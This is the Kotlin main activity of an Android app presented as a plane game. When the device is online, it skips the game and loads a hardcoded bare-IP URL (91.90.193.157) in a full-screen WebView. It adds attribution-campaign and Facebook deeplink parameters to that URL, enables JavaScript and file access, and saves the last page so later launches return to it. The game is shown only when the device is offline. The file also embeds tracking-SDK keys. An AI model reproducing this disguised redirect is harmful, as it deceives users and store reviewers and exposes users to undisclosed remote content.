package com.example.planegame

import android.content.Context
import android.content.Intent
import android.content.SharedPreferences
import android.net.ConnectivityManager
import android.net.NetworkInfo
import android.os.Bundle
import android.util.Log
import android.view.View
import android.webkit.*
import androidx.appcompat.app.AppCompatActivity
import com.appsflyer.AppsFlyerConversionListener
import com.appsflyer.AppsFlyerLib
import com.facebook.FacebookSdk
import com.facebook.applinks.AppLinkData
import com.onesignal.OneSignal

class MainActivity : AppCompatActivity() {

    var view: WebView? = null
    var webSettings: WebSettings? = null
    var netInfo: NetworkInfo? = null
    var count = 0
    var urlhost = ""
    var mSettings: SharedPreferences? = null
    val APP_PREFERENCES = "myurl"
    val APP_PREFERENCES_URL = "url"
    var urGogoDef = "http://91.90.193.157/gdVVxt"
    var urGogo = ""
    var deepPartone = ""
    var namingSl = ""
    var afStatus = ""
    var editor: SharedPreferences.Editor? = null

    private val AF_DEV_KEY = "amo2d7TLYZCBfJ9Fk4gYt6"
    private val ONESIGNAL_APP_ID = "ab12b52f-dfc7-468b-b38b-9015f6a89f4f"


    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        OneSignal.setLogLevel(OneSignal.LOG_LEVEL.VERBOSE, OneSignal.LOG_LEVEL.NONE)
        OneSignal.initWithContext(this)
        OneSignal.setAppId(ONESIGNAL_APP_ID)
        setContentView(R.layout.activity_main)

        val conversionListener: AppsFlyerConversionListener = object : AppsFlyerConversionListener {
            override fun onConversionDataSuccess(conversionData: Map<String, Any>) {
                val c = "campaign"
                val `as` = "af_status"
                for (attrName in conversionData.keys) {
                    if (c == attrName) {
                        namingSl = (conversionData[attrName] as String?)!!
                        Log.e("appflyer_IFFF_one", "nameC =$namingSl")
                    }
                    if (`as` == attrName) {
                        afStatus = (conversionData[attrName] as String?)!!
                        Log.e("appflyer_IFFF_two", "afStatus =$afStatus")
                    }
                    Log.d(
                        "appflyer", "attribute: " + attrName + " =!! " + conversionData[attrName]
                    )
                }
            }

            override fun onConversionDataFail(errorMessage: String) {
                Log.d("appflyer", "error getting conversion data: $errorMessage")
            }

            override fun onAppOpenAttribution(attributionData: Map<String, String>) {
                var linkA: String? = ""
                val li = "link"
                for (attrName in attributionData.keys) {
                    if (attrName == li && attributionData[attrName] != null) {
                        linkA = attributionData[attrName]
                        Log.d(
                            "log:appflyer",
                            "attribute: " + attrName + " = " + linkA + " SIze" + attributionData.size
                        )
                        val dParts = linkA!!.split("\\?").toTypedArray()
                        deepPartone = "?" + dParts[1]
                        Log.d("appflyer", "deeplink part=$deepPartone")
                    }
                    Log.d(
                        "appflyer", "attribute: " + attrName + " = " + attributionData[attrName]
                    )
                }
            }

            override fun onAttributionFailure(errorMessage: String) {
                Log.d("log", "error onAttributionFailure : $errorMessage")
            }
        }
        AppsFlyerLib.getInstance().init(AF_DEV_KEY, conversionListener, this)
        AppsFlyerLib.getInstance().startTracking(this)

        mSettings = getSharedPreferences(APP_PREFERENCES, MODE_PRIVATE)
        if (mSettings?.contains(APP_PREFERENCES_URL)!!) {
            urGogo = mSettings?.getString(APP_PREFERENCES_URL, "")!!
            Log.e(
                "log:URL_save", "urGogo=" + urGogo + "---APP_PREFERENCES_URL=" + APP_PREFERENCES_URL
            )
        } else {
            urGogo = urGogoDef
            Log.e(
                "log:URL_save_ELSE",
                "urGogo=" + urGogo + "---APP_PREFERENCES_URL=" + APP_PREFERENCES_URL
            )
        }


        // for FB Facebook
        var intent = intent
        val data = intent.data

        try {
            urlhost = data!!.query!!
            urlhost = "?$urlhost"
            Log.i("log", "urlhost$urlhost")
        } catch (e: Exception) {
            e.printStackTrace()
        }

        if (isOnlineNet(this)) {
            FacebookSdk.setAutoInitEnabled(true)
            FacebookSdk.fullyInitialize()
            AppLinkData.fetchDeferredAppLinkData(
                this
            ) { appLinkData ->
                if (appLinkData != null) {
                    val facelink = appLinkData.targetUri!!.query //we take a deeplink from Facebook
                    Log.i("DEBUG_FACEBOOK_SDK", "DeepLink facelink:$facelink")
                    urlhost = "?$facelink"
                    Log.i("DEBUG_FACEBOOK_SDK", "DeepLink urlhost:$urlhost")
                    try {
                        startConv()
                    } catch (e: InterruptedException) {
                        e.printStackTrace()
                    }
                } else {
                    Log.i("DEBUG_FACEBOOK_SDK", "AppLinkData is Null")
                    try {
                        startConv()
                    } catch (e: InterruptedException) {
                        e.printStackTrace()
                    }
                }
            }
        } else {
            intent = Intent(this, GameActivity::class.java)
            startActivity(intent)
        }
    }


    @Throws(InterruptedException::class)
    fun startConv() {
        var timer_count = 0
        while (timer_count < 10 && afStatus.isEmpty()) {
            Thread.sleep(1000)
            timer_count++
            Log.e(
                "naming:",
                "pause:$timer_count--namingComp=$namingSl--afStatus=$afStatus"
            )
        }
        Log.e("naming:", "START2 operations with deeplink and naming namingComp=$namingSl")
        if (!deepPartone.isEmpty()) {
            if (urGogo.contains("?") != true) {
                urGogo = urGogo + deepPartone
                Log.e("deep:", "urGogo:$urGogo")
            }
        } else {
            if (urGogo.contains("?") != true) {
                if (!namingSl.isEmpty() && namingSl != "None") {
                    val nameParam = arrayOf("namegame", "store", "key", "id", "bayerid")
                    try {
                        val nParts = namingSl.split("_").toTypedArray()
                        var namingPart = ""
                        for (i in nameParam.indices) {
                            namingPart = if (i == 0) {
                                namingPart + "?" + nameParam[i] + "=" + nParts[i]
                            } else {
                                namingPart + "&" + nameParam[i] + "=" + nParts[i]
                            }
                            Log.e("naming_FOR:", "namingPart= $namingPart")
                        }
                        urGogo += namingPart
                        Log.e("naming:", "urlGo:$urGogo")
                    } catch (e: java.lang.Exception) {
                        e.printStackTrace()
                    }
                }
            }
        }
        count = 1
        view = findViewById<View>(R.id.webView) as WebView
        view!!.post {
            webSettings = view!!.settings
            webSettings!!.javaScriptEnabled = true // enable javascript execution
            webSettings!!.domStorageEnabled = true//to save cookies
            webSettings!!.builtInZoomControls = true
            webSettings!!.setSupportZoom(true)
            webSettings!!.displayZoomControls = false
            view!!.setInitialScale(1)
            webSettings!!.loadWithOverviewMode = true
            webSettings!!.useWideViewPort = true
            view!!.settings.allowContentAccess = true
            view!!.settings.allowFileAccess = true
            view!!.loadUrl(urGogo)

            view!!.webViewClient = object : WebViewClient() {
                override fun onPageFinished(view: WebView, url: String) {
                    CookieSyncManager.getInstance().sync()
                    urGogo = view.url!!
                    editor = mSettings!!.edit()
                    editor?.putString(APP_PREFERENCES_URL, urGogo)
                    editor?.apply()
                }

                override fun shouldOverrideUrlLoading(
                    webView: WebView,
                    request: WebResourceRequest
                ): Boolean {
                    return false
                }
            }
        }
    }


    override fun onBackPressed() {
        if (count == 1) {
            if (view!!.canGoBack()) {
                view!!.goBack()
            } else {

                super.onBackPressed()
            }
        } else {
            super.onBackPressed()
        }
    }


    private fun isOnlineNet(context: Context): Boolean {
        val cm = context.getSystemService(CONNECTIVITY_SERVICE) as ConnectivityManager
        netInfo = cm.activeNetworkInfo
        return netInfo != null && netInfo!!.isConnectedOrConnecting
    }
}